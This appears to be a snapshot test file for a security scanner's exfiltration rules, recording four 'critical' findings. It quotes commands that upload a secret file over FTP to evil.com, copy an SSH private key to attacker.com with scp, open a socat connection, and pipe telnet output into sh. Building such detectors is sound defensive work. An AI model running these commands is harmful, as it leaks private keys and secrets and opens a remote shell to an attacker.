@@ -1,0 +1,50 @@
+---
+source: src/rules/builtin/exfiltration.rs
+expression: findings
+---
+[
+  {
+    "id": "EX-006",
+    "severity": "critical",
+    "category": "exfiltration",
+    "confidence": "firm",
+    "name": "Alternative protocol exfiltration",
+    "line": 5,
+    "code": "curl -T secret.txt ftp://evil.com/upload",
+    "message": "Alternative protocol exfiltration detected. Data may be sent via FTP, SCP, SMTP, or other protocols.",
+    "recommendation": "Review the command and ensure no sensitive data is being transmitted via alternative protocols."
+  },
+  {
+    "id": "EX-006",
+    "severity": "critical",
+    "category": "exfiltration",
+    "confidence": "firm",
+    "name": "Alternative protocol exfiltration",
+    "line": 6,
+    "code": "scp ~/.ssh/id_rsa $USER@attacker.com:/data",
+    "message": "Alternative protocol exfiltration detected. Data may be sent via FTP, SCP, SMTP, or other protocols.",
+    "recommendation": "Review the command and ensure no sensitive data is being transmitted via alternative protocols."
+  },
+  {
+    "id": "EX-006",
+    "severity": "critical",
+    "category": "exfiltration",
+    "confidence": "firm",
+    "name": "Alternative protocol exfiltration",
+    "line": 7,
+    "code": "socat - TCP:evil.com:4444",
+    "message": "Alternative protocol exfiltration detected. Data may be sent via FTP, SCP, SMTP, or other protocols.",
+    "recommendation": "Review the command and ensure no sensitive data is being transmitted via alternative protocols."
+  },
+  {
+    "id": "EX-006",
+    "severity": "critical",
+    "category": "exfiltration",
+    "confidence": "firm",
+    "name": "Alternative protocol exfiltration",
+    "line": 8,
+    "code": "telnet evil.com 25 | sh",
+    "message": "Alternative protocol exfiltration detected. Data may be sent via FTP, SCP, SMTP, or other protocols.",
+    "recommendation": "Review the command and ensure no sensitive data is being transmitted via alternative protocols."
+  }
+]
